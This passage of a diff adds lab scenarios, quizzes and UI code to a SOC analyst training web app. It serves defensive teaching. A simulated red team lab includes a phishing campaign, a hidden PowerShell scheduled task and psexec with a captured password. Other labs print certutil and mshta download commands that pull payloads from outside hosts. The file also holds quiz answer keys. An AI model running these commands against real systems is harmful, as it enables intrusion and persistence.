+    {name:'Port Scan Detection',tag:'med',brief:'IDS fired: "Internal host conducting port scan." Source: WKST-018 (10.0.5.18). 4,200 connection attempts in 30 seconds against 192.168.1.0/24. No user logged in at the time.',objectives:['Determine if malicious or authorized','Identify what triggered the scan','Contain and investigate WKST-018'],steps:[{cmd:'',out:[['term-info','=== IDS ALERT: PORT SCAN DETECTED ==='],['term-dim','Source:   10.0.5.18 (WKST-018)'],['term-warn','Attempts: 4,200 in 30 seconds'],['term-dim','Targets:  192.168.1.0/24 — full subnet scan'],['term-dim','User:     NO ACTIVE SESSION at time of scan'],['',' ']]},{cmd:'check-change-mgmt --host WKST-018 --date today',out:[['term-ok','  No authorized maintenance window'],['term-ok','  No IT task ticket for WKST-018 today'],['term-alert','  No authorized explanation found for scan activity'],['',' ']]},{cmd:'edr-query WKST-018 --process --last 2h',out:[['term-alert','  23:44:11 — rundll32.exe launched from TEMP folder'],['term-alert','  23:44:14 — Network scanner: masscan.exe (renamed to svchost.exe)'],['term-warn','  23:41:08 — Suspicious macro execution in Word document'],['',' ']]},{cmd:'isolate-host WKST-018 && escalate --level L2 --priority P1',out:[['term-ok','  ✓ WKST-018 isolated from network'],['term-ok','  ✓ P1 ticket created — L2 assigned'],['term-info','  VERDICT: Compromised host running internal recon'],['term-info','  NEXT STEP: L2 full forensic investigation'],['',' ']]}]},
+    {name:'Data Exfiltration Alert',tag:'hard',brief:'DLP alert: 847MB uploaded from WKST-009 (Alex Reyes, R&D) to an external cloud service outside approved list. Time: 17:55 — 5 mins before end of business. IP: 104.18.22.141.',objectives:['Identify the destination service','Determine what data was sent','Preserve evidence and notify management'],steps:[{cmd:'',out:[['term-info','=== DLP ALERT: LARGE UPLOAD DETECTED ==='],['term-warn','Size:    847 MB in 4 minutes'],['term-dim','Source:  WKST-009 (a.reyes — R&D Dept)'],['term-dim','Dest IP: 104.18.22.141'],['term-dim','Time:    17:55:12 UTC'],['',' ']]},{cmd:'ip-lookup 104.18.22.141',out:[['term-warn','  Service: Mega.nz (end-to-end encrypted cloud)'],['term-alert','  Status: NOT on approved cloud storage list'],['term-warn','  Policy: All external uploads >100MB require approval'],['',' ']]},{cmd:'dlp-query --host WKST-009 --filetype --last 1h',out:[['term-alert','  Project_IRIS_complete_designs.zip  (312 MB)'],['term-alert','  Q1_2024_roadmap_CONFIDENTIAL.pdf   (28 MB)'],['term-alert','  patent_applications_draft.docx     (4 MB)'],['term-warn','  All files classified: RESTRICTED/IP'],['',' ']]},{cmd:'preserve-evidence WKST-009 && notify --ciso --legal',out:[['term-ok','  ✓ Forensic image initiated — chain of custody logged'],['term-ok','  ✓ CISO and Legal notified immediately'],['term-ok','  ✓ Account suspended pending investigation'],['term-info','  VERDICT: Potential IP theft — escalate to L2 + Legal'],['',' ']]}]}
+  ],
+  l2:[
+    {name:'SIEM Correlation Rule Build',tag:'med',brief:'Build a Splunk detection rule for password spraying (MITRE T1110.003). Attackers try one password against many accounts to avoid lockout.',objectives:['Understand the spray pattern','Write the SPL detection query','Backtest and validate'],steps:[{cmd:'',out:[['term-info','=== SPLUNK SEARCH HEAD ==='],['term-dim','ATT&CK: T1110.003 — Password Spraying'],['term-dim','Pattern: 1 password × many accounts'],['',' ']]},{cmd:'index=wineventlog EventCode=4625 | stats count dc(TargetUserName) as uniq by src_ip | where uniq > 10 AND count < 50',out:[['term-ok','  EventCode 4625 = Failed logon'],['term-ok','  dc(TargetUserName) = distinct users targeted'],['term-alert','  ⚑ 10.14.2.88 → 34 unique accounts, 34 failures'],['',' ']]},{cmd:'create-alert --name "Password Spray" --threshold uniq=10 --window 1h',out:[['term-ok','  ✓ Alert created and active'],['term-ok','  ✓ ATT&CK tag: T1110.003 attached'],['term-ok','  ✓ Assigned to L2 analyst queue'],['',' ']]},{cmd:'backtest-alert --days 30 --alert "Password Spray"',out:[['term-ok','  True positives: 3 | False positives: 1'],['term-warn','  → Add exclusion: IT_ADMIN_subnet'],['term-ok','  Rule ready for production after exclusion'],['',' ']]}]},
+    {name:'Ransomware PCAP Analysis',tag:'med',brief:'Analyze a PCAP from an infected machine showing ransomware C2, exfiltration, and infection vector.',objectives:['Identify C2 communication','Detect exfiltration','Find infection vector'],steps:[{cmd:'',out:[['term-info','=== WIRESHARK CLI — PCAP ANALYSIS ==='],['term-dim','File: incident_wkst022_capture.pcap (847 MB)'],['',' ']]},{cmd:'tshark -r capture.pcap -q beaconing',out:[['term-alert','  BEACONING: 91.215.14.22:443 every 60.0s ± 0.2s'],['term-alert','  29 connections | Certificate CN: FAKE CDN name'],['',' ']]},{cmd:'tshark -r capture.pcap -Y "ip.dst==91.215.14.22 and frame.len > 5000"',out:[['term-alert','  14:28 → 4.2 MB | 14:29 → 8.1 MB | 14:29 → 2.3 MB'],['term-warn','  TOTAL EXFIL: ~14.6 MB before encryption began'],['',' ']]},{cmd:'extract-http-objects capture.pcap | grep -E "(exe|xlsm)"',out:[['term-alert','  VECTOR: macro_enabled_doc.xlsm downloaded 3 min prior'],['term-ok','  Payload: BlackCat/ALPHV ransomware variant identified'],['',' ']]}]},
+    {name:'Insider Threat Hunt',tag:'hard',brief:'HR flagged R. Patel (Data Analyst) who resigned Friday. Hunt for data staging and exfiltration over the past 14 days.',objectives:['Identify unusual access patterns','Detect exfiltration','Document for HR/Legal'],steps:[{cmd:'',out:[['term-info','=== INSIDER THREAT MONITORING ==='],['term-warn','LEGAL: Authorized by HR & Legal — case #IT-2024-019'],['term-dim','Subject: r.patel@company.com | Data Analyst'],['',' ']]},{cmd:'dlp-query --user r.patel --last 14d --events download',out:[['term-ok','  Jan 1–11: avg 12 downloads/day (baseline)'],['term-alert','  Jan 12:  342 downloads — resignation date'],['term-warn','  Files: customer_data_Q4_2023.csv (890k rows PII)'],['',' ']]},{cmd:'email-analysis --user r.patel --external --attachments',out:[['term-alert','  Jan 13 17:44 → rpatel.work@gmail.com: 24MB archive'],['term-alert','  Jan 14 18:01 → rpatel.work@gmail.com: 8MB pipeline data'],['',' ']]},{cmd:'generate-report --user r.patel --case IT-2024-019 --format legal',out:[['term-ok','  ✓ Evidence report with chain of custody logged'],['term-ok','  ✓ Forwarded to HR, Legal, and CISO'],['term-info','  RECOMMENDATION: Revoke access, involve Legal immediately'],['',' ']]}]},
+    {name:'Lateral Movement Hunt',tag:'hard',brief:'Threat intel feed reports a new campaign using WMI for lateral movement. Hunt your environment for T1021.006 activity over the past 48 hours.',objectives:['Query WMI-related event logs','Identify anomalous lateral connections','Map the attack path'],steps:[{cmd:'',out:[['term-info','=== THREAT INTEL HUNT — T1021.006 ==='],['term-dim','Technique: WMI Lateral Movement'],['term-dim','Window: Last 48 hours | Scope: All endpoints'],['',' ']]},{cmd:'index=wineventlog EventCode=4648 process="wmiprvse.exe" | stats count by src_host dest_host | sort -count',out:[['term-alert','  WKST-019 → FILESRV-01  : 14 connections (ANOMALY)'],['term-alert','  WKST-019 → DC-01       : 9 connections (ANOMALY)'],['term-ok','  All other hosts: 0–1 connections (normal)'],['',' ']]},{cmd:'timeline WKST-019 --start -48h --events network,process',out:[['term-alert','  T-48h: Phishing email opened on WKST-019'],['term-alert','  T-47h: PowerShell downloader executed'],['term-alert','  T-46h: WMI connections begin to 14 internal hosts'],['term-warn','  DC-01 connection at T-44h — possible credential dump'],['',' ']]},{cmd:'isolate-multiple WKST-019 && threat-hunt-report --attckid T1021.006',out:[['term-ok','  ✓ WKST-019 isolated — C2 comms terminated'],['term-ok','  ✓ All affected hosts flagged for investigation'],['term-ok','  ✓ Hunt report generated with ATT&CK mapping'],['term-info','  SCOPE: 14 potentially touched hosts — full IR required'],['',' ']]}]},
+    {name:'Cloud Access Anomaly',tag:'med',brief:'Azure AD logs show a user (t.wilson) accessing SharePoint and downloading 3,200 files over 18 minutes from an AWS IP. The user is a junior HR associate.',objectives:['Confirm account compromise','Assess data accessed','Contain via conditional access'],steps:[{cmd:'',out:[['term-info','=== AZURE AD ALERT: MASS DOWNLOAD ==='],['term-dim','User:     t.wilson@company.com (HR Associate)'],['term-dim','Source:   54.214.188.103 (AWS EC2 instance)'],['term-warn','Files:    3,200 documents in 18 minutes'],['',' ']]},{cmd:'azuread-signin t.wilson --last 24h',out:[['term-ok','  09:02 | Toronto CA | User laptop (normal)'],['term-alert','  14:34 | Oregon US  | AWS IP — impossible travel'],['term-warn','  → 5h 32m gap, different country, cloud VM'],['',' ']]},{cmd:'sharepoint-audit t.wilson --last 24h',out:[['term-alert','  3,247 files accessed (normal daily = 18)'],['term-alert','  Folders: HR records, salary data, org charts'],['term-warn','  Files classified: CONFIDENTIAL-HR'],['',' ']]},{cmd:'conditional-access revoke t.wilson && mfa-challenge --all-sessions',out:[['term-ok','  ✓ All active sessions terminated'],['term-ok','  ✓ MFA re-challenge issued for all sign-ins'],['term-ok','  ✓ IR ticket P1 created — L2 and HR notified'],['term-info','  VERDICT: Account compromise via credential stuffing'],['',' ']]}]}
+  ],
+  l3:[
+    {name:'Malware Static Analysis',tag:'med',brief:'Recovered svchost64.exe from a compromised server. AV clean. Perform static analysis without executing it.',objectives:['Extract meaningful strings','Identify imported functions','Determine malware family'],steps:[{cmd:'',out:[['term-info','=== STATIC ANALYSIS WORKSTATION ==='],['term-dim','Sample: svchost64.exe | 2.1 MB | AV: Clean'],['',' ']]},{cmd:'strings svchost64.exe | grep -E "(http|cmd|reg|task)"',out:[['term-alert','  http://91.215.14.22/gate.php (C2 URL)'],['term-alert','  cmd.exe /c powershell -enc %s'],['term-alert','  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'],['term-alert','  schtasks /create /sc minute /mo 5 (persistence)'],['',' ']]},{cmd:'dumpbin /imports svchost64.exe | grep -E "(Crypt|Internet|Process)"',out:[['term-alert','  CryptEncrypt → Data encryption'],['term-alert','  InternetOpenUrl → HTTP C2 comms'],['term-alert','  CreateRemoteThread → Process injection'],['',' ']]},{cmd:'pe-info svchost64.exe --sections --entropy',out:[['term-warn','  .text entropy: 7.9/8.0 — PACKED'],['term-ok','  Packer: UPX (modified)'],['term-info','  Family: AgentTesla Stealer variant'],['',' ']]}]},
+    {name:'Memory Forensics Hunt',tag:'hard',brief:'A server took a memory dump before reboot. Fileless malware suspected — it never touched disk. Analyze with Volatility.',objectives:['Find injected processes','Extract network connections','Recover injected payload'],steps:[{cmd:'',out:[['term-info','=== VOLATILITY 3 — MEMORY FORENSICS ==='],['term-dim','Image: server01_memdump.mem | 16 GB | Win Server 2019'],['',' ']]},{cmd:'vol3 -f memdump.mem windows.pstree | grep svchost',out:[['term-ok','  PID 664  svchost.exe (PPID: 576 services.exe) — normal'],['term-alert','  PID 3882 svchost.exe (PPID: 4412 notepad.exe) ⚑ ANOMALY'],['term-warn','  → svchost.exe should NEVER be child of notepad.exe'],['',' ']]},{cmd:'vol3 -f memdump.mem windows.netscan | grep 3882',out:[['term-alert','  PID 3882 | TCP | 10.0.1.15 → 91.215.14.22:443 ESTABLISHED'],['term-warn','  → Same C2 IP as previous investigation (same actor!)'],['',' ']]},{cmd:'vol3 -f memdump.mem windows.malfind | grep -A5 "PID 3882"',out:[['term-alert','  MZ header detected | PAGE_EXECUTE_READWRITE'],['term-ok','  Extracted: injected_payload_pid3882.bin (48 KB)'],['term-info','  FINDING: Cobalt Strike Beacon injected into notepad.exe'],['',' ']]}]},
+    {name:'Red Team Simulation',tag:'hard',brief:'Authorized simulation against REDLAB-01. Demonstrate initial access via phishing, persistence, and lateral movement.',objectives:['Phishing delivery (T1566)','Persistence (T1053)','Lateral movement (T1021)'],steps:[{cmd:'',out:[['term-info','=== RED TEAM ENGAGEMENT CONSOLE ==='],['term-warn','AUTHORIZED: REDLAB-01 only | ROE signed by CISO'],['',' ']]},{cmd:'gophish send-campaign --template "IT Password Reset" --targets redlab-users.csv',out:[['term-ok','  t.nguyen CLICKED → SUBMITTED CREDENTIALS'],['term-alert','  Captured: t.nguyen / Summer2024!'],['term-info','  ATT&CK T1566.002 — Spearphishing Link: EXECUTED'],['',' ']]},{cmd:'schtasks /create /sc minute /mo 5 /tn "SystemUpdate" /tr "powershell -w hidden -enc [payload]"',out:[['term-ok','  Persistence established — runs every 5 min as SYSTEM'],['term-info','  ATT&CK T1053.005 — Scheduled Task: EXECUTED'],['term-warn','  Blue team detection: NONE (detection gap found)'],['',' ']]},{cmd:'psexec \\\\FILESRV-01 -u t.nguyen -p Summer2024! cmd.exe',out:[['term-ok','  Connected to FILESRV-01 — Finance share accessible'],['term-info','  ATT&CK T1021.002 — SMB Admin Shares: EXECUTED'],['term-ok','  ✓ Report: 3 techniques | 2 detection gaps found'],['',' ']]}]},
+    {name:'Threat Hunt: Living Off the Land',tag:'hard',brief:'Intelligence suggests an APT group is using legitimate Windows tools (LOLBins) to avoid AV. Hunt for T1218 (System Binary Proxy Execution) across your fleet.',objectives:['Identify suspicious LOLBin usage','Build hunting query','Map findings to ATT&CK'],steps:[{cmd:'',out:[['term-info','=== THREAT HUNT: LOLBINS — T1218 ==='],['term-dim','LOLBins: regsvr32, certutil, mshta, rundll32'],['term-dim','These are legitimate tools abused by attackers'],['',' ']]},{cmd:'index=sysmon EventCode=1 Image IN ("*certutil*","*mshta*","*regsvr32*") | stats count by Image CommandLine host | sort -count',out:[['term-alert','  certutil.exe -urlcache -f http://91.215.14.22/payload.exe — 3 hosts'],['term-alert','  mshta.exe http://badsite.io/stage2.hta — 1 host'],['term-ok','  rundll32.exe — 890 occurrences — within normal range'],['',' ']]},{cmd:'correlate --hosts certutil-hits --events network,registry --window 30m',out:[['term-alert','  WKST-007: certutil download → dropper execution 4 min later'],['term-alert','  WKST-014: certutil download → same dropper on different host'],['term-warn','  Both hosts beaconing to 91.215.14.22 within 10 min'],['',' ']]},{cmd:'create-detection --name "LOLBin Downloader" --attck T1218 --severity HIGH',out:[['term-ok','  ✓ Detection rule created for certutil/mshta URL downloads'],['term-ok','  ✓ Retroactive alert backfilled — 3 more historic hits found'],['term-info','  HUNT RESULT: 2 active compromises + 1 new detection rule'],['',' ']]}]},
+    {name:'Ransomware Group Attribution',tag:'hard',brief:'After containing a ransomware incident, leadership asks: who did this? Use IOC pivoting and OSINT to attribute the attack to a known threat actor group.',objectives:['Pivot from IOCs to actor infrastructure','Cross-reference threat intel platforms','Produce an attribution summary'],steps:[{cmd:'',out:[['term-info','=== THREAT ATTRIBUTION INVESTIGATION ==='],['term-dim','C2 IP: 91.215.14.22 | Ransomware: ALPHV/BlackCat'],['term-dim','Goal: Identify the specific affiliate or group'],['',' ']]},{cmd:'pivot-ioc 91.215.14.22 --passive-dns --whois',out:[['term-warn','  Passive DNS: 14 domains resolved to this IP (last 90 days)'],['term-alert','  blackcat-ransom[.]onion linked via shared infrastructure'],['term-warn','  Registration pattern matches known ALPHV affiliate cluster'],['',' ']]},{cmd:'maltego-query --domain blackcat-ransom.onion --expand',out:[['term-alert','  Linked to: UNC2659 (tracked by Mandiant)'],['term-warn','  Campaign: "Operation CryptoLock" — active since Q3 2023'],['term-info','  TTPs match: ALPHV affiliate targeting financial sector'],['',' ']]},{cmd:'generate-attribution-report --actor UNC2659 --confidence medium',out:[['term-ok','  ✓ Attribution report: "Probable ALPHV affiliate (UNC2659)"'],['term-ok','  ✓ Confidence: Medium (infrastructure overlap, no HUMINT)'],['term-ok','  ✓ Shared with ISAC and legal team'],['term-info','  NOTE: Attribution is probabilistic, not definitive'],['',' ']]}]}
+  ]
+};
+
+const QUIZZES = {
+  l1:[
+    {q:'You see a login from Brazil at 2am for a user whose last 90 days of logins are all from Toronto during business hours. What is your FIRST action?',opts:['Delete the account immediately','Disable the account and open a P2 incident ticket','Ignore it — users travel','Email the user asking if they are in Brazil'],ans:1,exp:'Disabling the account stops any active attacker session immediately. Never delete — you need evidence. Never ignore a clear impossibility-of-travel anomaly.'},
+    {q:'Which Windows Event ID indicates a SUCCESSFUL logon?',opts:['4624','4625','4720','4648'],ans:0,exp:'Event ID 4624 = Successful logon. 4625 = Failed logon. Knowing key Event IDs lets you filter noise fast.'},
+    {q:'An alert fires 200 times a day and is always a false positive. What should you recommend?',opts:['Keep acknowledging each one manually','Delete the alert rule entirely','Tune the rule to reduce false positives or add an exclusion','Escalate all 200 to L2 daily'],ans:2,exp:'Alert fatigue is a real threat. 200 daily false positives means analysts start ignoring alerts. Tuning reduces noise while keeping detection capability.'},
+    {q:'At which phase of the NIST 800-61 lifecycle do you isolate a compromised machine?',opts:['Preparation','Detection & Analysis','Containment','Recovery'],ans:2,exp:'Containment is the phase where you stop the threat from spreading. Isolating cuts off the attacker without destroying evidence.'},
+    {q:'What does the "A" in the CIA triad stand for, and why does it matter?',opts:['Authentication — verifying who you are','Authorization — what you can access','Availability — systems must be accessible when needed','Auditing — recording what happened'],ans:2,exp:'Availability means systems must work when users need them. A DoS attack targets availability. SOC analysts must detect and respond to availability threats, not just confidentiality breaches.'}
+  ],
+  l2:[
+    {q:'You are writing a Splunk rule to detect password spraying (T1110.003). Which logic correctly identifies this pattern?',opts:['Many failed logins for ONE user from one IP','ONE failed login for many users from one IP','Many successful logins from many IPs','Zero failed logins followed by one success'],ans:1,exp:'Password spraying = 1 password tried against MANY accounts. This avoids lockout policies. Your rule should trigger on high unique user count from a single source IP.'},
+    {q:'In Wireshark, traffic from an infected host goes to the same external IP every exactly 60 seconds. What is this pattern called?',opts:['Port scanning','Beaconing','DNS tunneling','ARP poisoning'],ans:1,exp:'Beaconing is the regular, clock-like check-in from malware to its C2 server. The regular interval is the giveaway — legitimate traffic is not this uniform.'},
+    {q:'Your SOAR playbook auto-blocks IPs from a threat feed. A business partner\'s IP gets blocked. What safeguard should have been in place?',opts:['Never automate blocking','A whitelist of trusted IPs checked before any block action','Review every IP in the feed daily','Block all external IPs by default'],ans:1,exp:'Automation is powerful but needs safeguards. A whitelist of known-good IPs ensures automated actions don\'t disrupt legitimate business operations.'},
+    {q:'Why is taking a memory dump BEFORE rebooting a ransomware-infected machine critical?',opts:['To speed up recovery','RAM is permanent storage','Fileless malware, encryption keys, and C2 details in memory disappear on reboot','Memory dumps are legally required'],ans:2,exp:'Many modern ransomware variants are fileless or store encryption keys only in RAM. Reboot = evidence gone forever.'},
+    {q:'What does the MITRE ATT&CK matrix primarily help SOC analysts do?',opts:['Calculate CVSS scores','Map observed behaviors to known adversary techniques and find detection gaps','Automatically block malicious IPs','Generate compliance reports'],ans:1,exp:'ATT&CK provides a shared language for describing attacker behavior. Tagging alerts with technique IDs helps you understand attack stage, find gaps, and prioritize defensive improvements.'}
+  ],
+  l3:[
+    {q:'During static analysis, a PE section has entropy of 7.9/8.0. What does this strongly suggest?',opts:['The file is a legitimate Microsoft binary','The code section is packed or encrypted','The malware only runs on Linux','The file is corrupted'],ans:1,exp:'High entropy (close to 8.0) means the data appears random — characteristic of compressed or encrypted content. A common packer/obfuscation technique used by malware authors.'},
+    {q:'In Volatility, svchost.exe is running as a child process of notepad.exe. Why is this suspicious?',opts:['svchost should have no children','svchost.exe should only be spawned by services.exe — not notepad.exe','notepad.exe is always malicious','Process parentage does not matter'],ans:1,exp:'Process hierarchy is a key detection signal. svchost.exe is legitimately spawned by services.exe. A notepad.exe parent indicates process hollowing or injection.'},
+    {q:'A threat hunt hypothesis is: "An attacker has used scheduled tasks for persistence." Which approach is most appropriate?',opts:['Check AV logs for detections','Stack-count all scheduled tasks across endpoints and investigate rare/unique ones','Review email gateway logs','Scan for open ports'],ans:1,exp:'Stack counting (frequency analysis) is a core hunt technique. Attackers\' tasks are rare or unique. Outliers deserve investigation.'},
+    {q:'In a red team engagement, what is a "purple team" exercise?',opts:['Red team attacks blue team as a surprise test','Red and blue collaborate — red executes a technique while blue attempts to detect it in real time','Purple team specialists focus only on phishing','Scanning for vulnerabilities without exploitation'],ans:1,exp:'Purple teaming turns red vs blue into a collaborative learning exercise. Immediate feedback from both sides accelerates defensive improvement.'},
+    {q:'You extract a PE file from a process using malfind. The memory region has PAGE_EXECUTE_READWRITE permissions. Why is this significant?',opts:['All normal Windows processes use RWX memory','It suggests shellcode or injected code — legitimate software rarely needs execute AND write in the same region','Set automatically by Windows Update','Only matters if running as SYSTEM'],ans:1,exp:'RWX memory regions are a classic indicator of code injection. Legitimate programs separate readable code from writeable data. Needing to both write AND execute the same region is a red flag.'}
+  ]
+};
+
+const CERT_INFO = {
+  l1:{title:'SOC <span>ANALYST</span> LEVEL 1',badge:'SOC L1 · THREAT IDENTIFICATION & BASIC INCIDENT RESPONSE',body:'Demonstrating proficiency in threat identification, alert triage, log analysis, and basic incident response as defined by the CCA Solutions SOC Analyst Training Program.',color:'var(--cyan)'},
+  l2:{title:'SOC <span>SPECIALIST</span> LEVEL 2',badge:'SOC L2 · ADVANCED ANALYSIS & COMPLEX THREAT HANDLING',body:'Demonstrating advanced proficiency in SIEM management, threat intelligence utilization, packet analysis, SOAR automation, and complex incident handling as defined by the CCA Solutions SOC Analyst Training Program.',color:'var(--purple)'},
+  l3:{title:'SOC <span>EXPERT</span> LEVEL 3',badge:'SOC L3 · MALWARE ANALYSIS, FORENSICS & RED TEAMING',body:'Demonstrating expert-level proficiency in malware analysis, digital forensics, threat hunting, OSINT, and red team operations as defined by the CCA Solutions SOC Analyst Training Program.',color:'var(--red)'}
+};
+
+// ═══════════════════════════════════════════
+// STATE & STORAGE
+// ═══════════════════════════════════════════
+const LS_KEY = 'cca_soc_progress_v2';
+
+function loadState() {
+  try {
+    const raw = localStorage.getItem(LS_KEY);
+    if (raw) {
+      const s = JSON.parse(raw);
+      // Scrub any saved file:// or blob:// URLs — these are local paths that can never work as embeds
+      if (s.videos) {
+        ['l1','l2','l3'].forEach(lv => {
+          if (Array.isArray(s.videos[lv])) {
+            s.videos[lv] = s.videos[lv].map(url => {
+              if (!url) return '';
+              try {
+                const u = new URL(url);
+                return (u.protocol === 'https:' || u.protocol === 'http:') ? url : '';
+              } catch(e) { return ''; }
+            });
+          }
+        });
+      }
+      return s;
+    }
+  } catch(e){}
+  return {
+    l1:{modules:[],quizPassed:false,labsDone:[]},
+    l2:{modules:[],quizPassed:false,labsDone:[]},
+    l3:{modules:[],quizPassed:false,labsDone:[]},
+    videos:{l1:[],l2:[],l3:[]},
+    activity:[]
+  };
+}
+
+function saveState(s) {
+  try { localStorage.setItem(LS_KEY, JSON.stringify(s)); } catch(e){}
+}
+
+let PS = loadState();
+
+const slideState = {
+  l1:{slide:0},l2:{slide:0},l3:{slide:0}
+};
+const labState = {
+  l1:{scenario:0,step:0},l2:{scenario:0,step:0},l3:{scenario:0,step:0}
+};
+const quizScores = {l1:0,l2:0,l3:0};
+
+// ═══════════════════════════════════════════
+// ACTIVITY LOG
+// ═══════════════════════════════════════════
+function logActivity(type, text) {
+  const ts = new Date().toLocaleTimeString('en-CA',{hour:'2-digit',minute:'2-digit'});
+  PS.activity = PS.activity || [];
+  PS.activity.unshift({type, text, ts});
+  if (PS.activity.length > 20) PS.activity = PS.activity.slice(0, 20);
+  saveState(PS);
+  renderActivityLog();
+}
+
+function renderActivityLog() {
+  const el = document.getElementById('activity-list');
+  if (!el) return;
+  const acts = PS.activity || [];
+  if (acts.length === 0) {
+    el.innerHTML = '<div class="no-activity">// NO ACTIVITY YET — START LEARNING</div>';
+    return;
+  }
+  el.innerHTML = acts.map(a => {
+    const dotClass = a.type === 'quiz' ? 'act-dot-quiz' : a.type === 'lab' ? 'act-dot-lab' : 'act-dot-mod';
+    return `<div class="activity-item"><div class="act-dot ${dotClass}"></div><span>${a.text}</span><span class="act-time">${a.ts}</span></div>`;
+  }).join('');
+}
+
+// ═══════════════════════════════════════════
+// NAVIGATION
+// ═══════════════════════════════════════════
+function switchTop(id, btn) {
+  document.querySelectorAll('.level-panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => { t.className = 'tab'; });
+  document.getElementById('panel-' + id).classList.add('active');
+  if (id === 'dash') { btn.classList.add('active-dash'); renderDashboard(); }
+  else btn.classList.add('active-' + id);
+}
+
+function switchSubTab(level, tab, btn) {
+  const panel = document.getElementById('panel-' + level);
+  panel.querySelectorAll('.content-pane').forEach(p => p.classList.remove('active'));
+  panel.querySelectorAll('.sub-tab').forEach(t => t.classList.remove('active'));
+  document.getElementById(level + '-' + tab).classList.add('active');
+  btn.classList.add('active');
+  if (tab === 'slides') initSlides(level);
+  if (tab === 'lab') initLabPanel(level);
+  if (tab === 'quiz') initQuiz(level);
+  if (tab === 'videos') renderVideoPanel(level);
+}
+
+// ═══════════════════════════════════════════
+// RENDER MODULES
+// ═══════════════════════════════════════════
+function renderModules(level) {
+  const grid = document.getElementById(level + '-module-grid');
+  if (!grid) return;
+  const mods = MODULES[level];
+  const done = PS[level].modules || [];
+  grid.innerHTML = mods.map((m, i) => {
+    const isDone = done.includes(i);
+    return `<div class="module-card ${isDone ? 'completed' : ''}" id="${level}-mod-${i}">
+      <div class="module-num">MODULE ${m.num}</div>
+      <h3>${m.title}</h3>
+      <p>${m.desc}</p>
+      <ul class="topic-list">${m.topics.map(t => `<li>${t}</li>`).join('')}</ul>
+      <div class="module-footer"><span>⏱ ${m.hrs} hrs</span><span>📹 ${m.vids} videos</span><span>📄 ${m.labs} labs</span></div>
+      <button class="mark-btn ${isDone ? 'done' : ''}" onclick="toggleModule('${level}',${i},this)">${isDone ? '✓ COMPLETED' : 'MARK COMPLETE'}</button>
+    </div>`;
+  }).join('');
+}
+
+function toggleModule(level, idx, btn) {
+  const done = PS[level].modules || [];
+  const pos = done.indexOf(idx);
+  const card = document.getElementById(level + '-mod-' + idx);
+  if (pos === -1) {
+    done.push(idx);
+    card.classList.add('completed');
+    btn.textContent = '✓ COMPLETED';
+    btn.classList.add('done');
+    logActivity('mod', `Completed ${level.toUpperCase()} Module ${String(idx+1).padStart(2,'0')}: ${MODULES[level][idx].title}`);
+  } else {
+    done.splice(pos, 1);
+    card.classList.remove('completed');
+    btn.textContent = 'MARK COMPLETE';
+    btn.classList.remove('done');
+  }
+  PS[level].modules = done;
+  saveState(PS);
+  updateDashBar(level);
+  checkCertUnlock(level);
+}
+
+// ═══════════════════════════════════════════
+// VIDEO PANEL
+// ═══════════════════════════════════════════
+function renderVideoPanel(level) {
+  const el = document.getElementById(level + '-video-content');
+  if (!el) return;
+  const slots = VIDEO_SLOTS[level];
+  const saved = PS.videos[level] || [];
+  const GITHUB_BASE = PS.githubBase || '';
+  const files = { l1:'soc-l1-lesson.html', l2:'soc-l2-lesson.html', l3:'soc-l3-lesson.html' };
+
+  const setupBanner = GITHUB_BASE ? '' : `
+    <div style="font-family:'Share Tech Mono',monospace;font-size:0.68rem;color:var(--amber);padding:9px 14px;background:rgba(255,179,0,0.06);border:1px solid rgba(255,179,0,0.18);margin-bottom:14px;letter-spacing:1px;">
+      ⚑ LESSON PLAYERS NOT LINKED YET — once you deploy to GitHub Pages, paste your base URL below and click SET to auto-fill all 9 video slots.
+    </div>
+    <div style="display:flex;gap:8px;margin-bottom:16px;">
+      <input type="text" id="github-base-input" placeholder="https://yourusername.github.io/soc-course" style="flex:1;background:var(--bg3);border:1px solid var(--border2);color:var(--text);font-family:'Share Tech Mono',monospace;font-size:0.72rem;padding:7px 12px;outline:none;">
+      <button onclick="setGithubBase()" style="font-family:'Share Tech Mono',monospace;font-size:0.68rem;letter-spacing:1.5px;padding:7px 18px;border:1px solid var(--green);background:rgba(0,255,136,0.08);color:var(--green);cursor:pointer;white-space:nowrap;">SET &amp; FILL ALL</button>
+    </div>`;
+
+  el.innerHTML = `<div class="video-section">
+    <div class="video-section-title">// PASTE A YOUTUBE, VIMEO, OR GITHUB PAGES URL TO LOAD LESSON VIDEOS</div>
+    ${setupBanner}
+    <div class="video-grid">${slots.map((s,i) => {
+      const rawUrl = saved[i] || '';
+      const url = isValidEmbedUrl(rawUrl) ? rawUrl : '';
+      const hint = GITHUB_BASE ? `${GITHUB_BASE}/${files[level]}` : 'Paste YouTube / Vimeo / https:// URL...';
+      return `<div class="video-card">
+        <div class="video-embed-wrap" id="vid-wrap-${level}-${i}">
+          ${url ? getEmbedHtml(url) : getPlaceholderHtml()}
+        </div>
+        <div class="video-meta">
+          <div class="video-meta-title">${s.title}</div>
+          <div class="video-meta-sub">${s.sub}</div>
+        </div>
+        <div class="video-url-input">
+          <input type="text" id="vid-input-${level}-${i}" placeholder="${hint}" value="${url}" onkeydown="if(event.key==='Enter')embedVideo('${level}',${i})">
+          <button class="video-url-btn" onclick="embedVideo('${level}',${i})">EMBED</button>
+        </div>
+      </div>`;
+    }).join('')}</div>
+  </div>`;
+}
+
+function setGithubBase() {
+  const input = document.getElementById('github-base-input');
+  if (!input) return;
+  const base = input.value.trim().replace(/\/$/, '');
+  if (!isValidEmbedUrl(base)) {
+    input.style.borderColor = 'var(--red)';
+    input.placeholder = 'Must be a valid https:// URL';
+    setTimeout(() => { input.style.borderColor = ''; }, 3000);
+    return;
+  }
+  PS.githubBase = base;
+  const files = { l1:'soc-l1-lesson.html', l2:'soc-l2-lesson.html', l3:'soc-l3-lesson.html' };
+  ['l1','l2','l3'].forEach(lv => {
+    PS.videos[lv] = PS.videos[lv] || [];
+    for (let i = 0; i < 3; i++) {
+      if (!isValidEmbedUrl(PS.videos[lv][i])) {
+        PS.videos[lv][i] = `${base}/${files[lv]}`;
+      }
+    }
+  });
+  saveState(PS);
+  ['l1','l2','l3'].forEach(lv => {
+    const pane = document.getElementById(lv + '-videos');
+    if (pane && pane.classList.contains('active')) renderVideoPanel(lv);
+  });
+  logActivity('mod', `GitHub Pages base URL saved: ${base}`);
+}
+
+function isValidEmbedUrl(url) {
+  if (!url || typeof url !== 'string') return false;
+  // Reject local file paths — only allow http/https
+  if (url.startsWith('file:') || url.startsWith('blob:') || url.startsWith('data:')) return false;
+  try {
+    const u = new URL(url);
